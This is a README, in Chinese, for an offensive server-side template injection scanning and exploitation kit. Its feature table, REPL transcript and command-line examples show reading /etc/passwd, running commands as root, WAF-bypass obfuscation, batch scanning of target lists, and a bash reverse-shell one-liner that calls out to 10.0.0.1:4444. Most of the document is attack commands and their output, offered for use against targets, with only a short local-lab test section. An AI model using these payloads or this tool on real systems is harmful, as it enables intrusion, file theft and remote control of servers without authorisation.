# SSTRIKE v3.0 — Server-Side Template Injection Strike Kit

**完全独立的 SSTI 扫描利用框架**，与任何现有工具无代码关联。采用全新的类遍历链路、指令体系和 Payload 链。

## 功能矩阵

| 功能 | 说明 |
|------|------|
| 🔍 指纹探测 | 自动识别 Jinja2 / Mako / Twig / FreeMarker / Velocity / Smarty |
| 📂 任意文件读取 | 利用 `__builtins__.open()` 读取服务器文件 |
| 💻 命令执行 (RCE) | 利用 `os.popen()` 执行系统命令 |
| ⏱ 延时盲注 | 通过 `time.sleep()` 测试盲注有效性 |
| 🔗 完整利用链路 | 一键执行：验证→配置泄露→类探测→文件读→命令执行→盲注 |
| 🎮 交互式 REPL | 8 条差异化指令，独立命名体系 |
| 🧵 多线程扫描 | 批量扫描目标列表 |
| 🛡 WAF 绕过 | 6 种混淆变形（实体编码/制表符/双写/URL编码/注释插入） |
| 🔌 HTTP 钩子 | Cookie / 自定义请求头注入 |
| 📡 反弹 Shell | 一键生成 bash / python / nc / php 反弹命令 |

## 安装

```bash
pip install requests
```

## 使用方式

### 交互式 REPL 模式

```bash
python3 sstrike.py
```

在交互式控制台中:

```
sstrike> scan http://target.com/page name GET
[*] 扫描: http://target.com/page
[+] 识别引擎: JINJA2

sstrike> probe
[+] 注入点可用

sstrike> dig /etc/passwd
[*] 读取: /etc/passwd
[+] 结果: root:x:0:0:root:/root:/bin/bash ...

sstrike> sink id
[*] 执行: id
[+] 结果: uid=0(root) gid=0(root) groups=0(root)

sstrike> blast 5
[*] 延时盲注测试: 5s
    期望: 5s, 实际: 5.12s, 状态: 延时生效

sstrike> shell 10.0.0.1 4444 bash
[+] 反弹 Shell [bash]
[+] 原始命令: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

sstrike> hook cookie PHPSESSID=abc123
[+] Cookie 已注入

sstrike> burst on
[+] WAF 绕过模式: 开启

sstrike> config
  目标:   http://target.com/page
  参数:   name
  方法:   GET
  引擎:   jinja2
  WAF:    开启
```

### 命令行模式

```bash
# 指纹扫描
python3 sstrike.py -u "http://target.com/page" -p name --scan

# 文件读取
python3 sstrike.py -u "http://target.com/page" -p name --read /etc/passwd

# 命令执行
python3 sstrike.py -u "http://target.com/page" -p name --cmd "id"

# 延时盲注
python3 sstrike.py -u "http://target.com/page" -p name --blind 5

# 完整利用链
python3 sstrike.py -u "http://target.com/page" -p name --chain --output result.json

# 批量扫描
python3 sstrike.py --list-targets targets.txt -p query --threads 20

# Cookie 注入 + WAF 绕过
python3 sstrike.py -u "http://target.com/page" -p q --cmd "id" \
  --cookie "PHPSESSID=abc; security=low" --burst
```

## 差异特性说明

| 项目 | SSTRIKE | 传统工具 |
|------|---------|---------|
| 类遍历链路 | `__init__.__globals__` → `__builtins__` | `lipsum`/`url_for`/`cycler` 全局变量 |
| 指令体系 | scan/probe/dig/sink/blast/loop/shell/hook | run/exploit/check/... |
| Payload 入口 | `''.__class__.__mro__[1].__subclasses__()` | `lipsum.__globals__` |
| 响应提取 | 算数结果 + 特征值多策略 | 固定正则匹配 |
| WAF 绕过 | 6 种混淆变形 | 通常无 |
| 批量扫描 | 线程池并发 | 通常单线程 |
| HTTP 注入 | Cookie/Header 自定义 | 通常无 |

## 测试

```bash
# 启动本地测试环境:
cd /opt/Class01
python3 app.py

# 在另一个终端:
cd /opt/Class01/tools
python3 sstrike.py
sstrike> scan https://localhost:5000/welcome name
sstrike> probe
sstrike> dig /etc/passwd
```
